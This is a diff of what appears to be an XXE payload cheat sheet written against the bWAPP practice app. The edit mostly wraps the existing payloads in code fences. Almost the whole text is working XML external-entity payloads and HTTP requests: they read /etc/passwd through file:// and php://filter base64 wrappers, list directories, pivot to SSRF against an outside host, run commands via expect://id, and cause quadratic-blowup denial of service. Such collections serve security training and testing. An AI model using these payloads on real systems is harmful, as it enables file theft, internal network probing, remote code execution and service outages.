@@ -9,6 +9,7 @@ Payload:
 Request:
 --------
 
+```http
 POST /bWAPP/bWAPP/xxe-2.php HTTP/1.1
 Host: 127.0.0.1
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
@@ -25,23 +26,25 @@ Connection: close
    <!ENTITY xxe SYSTEM "///etc/passwd">]>
 <reset><login>&xxe;</login><secret>Any bugs?</secret></reset>
 
-
+```
 
 
 Calling The Remote File
 ========================
+
 Payload:
 -------
 
-
+```xml
 <?xml version="1.0" encoding="ISO-8859-1"?>
 <!DOCTYPE testingxxe [<!ENTITY xxe SYSTEM "http://127.0.0.1/imx.txt" >]>
 <reset><login>&xxe;</login><secret>Any bugs?</secret></reset>
+```
 
 REQUEST:
 --------
 
-
+```http
 POST /bWAPP/bWAPP/xxe-2.php HTTP/1.1
 Host: 127.0.0.1
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
@@ -57,29 +60,34 @@ Connection: close
    <!ELEMENT foo ANY >
    <!ENTITY xxe SYSTEM "http://127.0.0.1/imx.txt" >]>
 <reset><login>&xxe;</login><secret>Any bugs?</secret></reset>
-
+```
 
 
 Calling The Local File
 ======================
 
+```xml
 <?xml version="1.0" encoding="ISO-8859-1"?>
 <!DOCTYPE Header [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
 <reset><login>&xxe;</login><secret>Any bugs?</secret></reset>
+```
 
 OR
 
+```xml
  <!DOCTYPE foo [  
    <!ELEMENT foo ANY >
    <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
 <reset><login>&xxe;</login><secret>Any bugs?</secret></reset>
+```
 
-=========================================================================================================
+---
 
 
 Reading Files
 -------------
 
+```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE student [
 <!ENTITY oops SYSTEM "file:///etc/passwd">
@@ -87,13 +95,14 @@ Reading Files
 <student>
 <name>&oops;</name>
 </student>
-
+```
 
 
 
 Listing Directories
 -------------------
 
+```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE student [
 <!ENTITY oops SYSTEM "file:///etc/ ">
@@ -101,13 +110,14 @@ Listing Directories
 <student>
 <name>&oops;</name>
 </student>
-
+```
 
 
 
 
 Base64 Conversion of Result
 ---------------------------
+```xml
 <!DOCTYPE student [
 <!ENTITY pwn SYSTEM "php://filter/convert.base64-
 encode/resource=/etc/passwd">
@@ -116,13 +126,14 @@ encode/resource=/etc/passwd">
 <name>&pwn;</name>
 </student>
 
-
+```
 
 
 
 XXE to SSRF
 -----------
 
+```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE student [
 <!ENTITY oops SYSTEM "http://scanme.nmap.org:20/">
@@ -130,7 +141,7 @@ XXE to SSRF
 <student>
 <name>&oops;</name>
 </student>
-
+```
 
 
 
@@ -138,6 +149,7 @@ XXE to SSRF
 xxe to RCE
 ----------
 
+```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE name [
 <!ENTITY rce SYSTEM "expect://id">
@@ -145,11 +157,13 @@ xxe to RCE
 <student>
 <name>&rce;</name>
 </student>
-
+```
 
 
 XXE to DOS
 -----------
+
+```xml
 
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE student [
@@ -158,7 +172,7 @@ XXE to DOS
 <student>
 <name>&oops;</name>
 </student>
-
+```
 
 
 
@@ -166,10 +180,11 @@ XXE to DOS
 XXE Quadratic blowup [DOS]
 ---------------------
 
+```xml
 <?xml version="1.0"?>
 <!DOCTYPE student [
 <!ENTITY x "xxxxxxxxxxxxxxxxx..."> (50,000-100,000)
 ]>
 <student>&x;&x;&x;&x;&x;&x;&x;&x;&x;...</student> (50,000-100,00)
-
+```
 
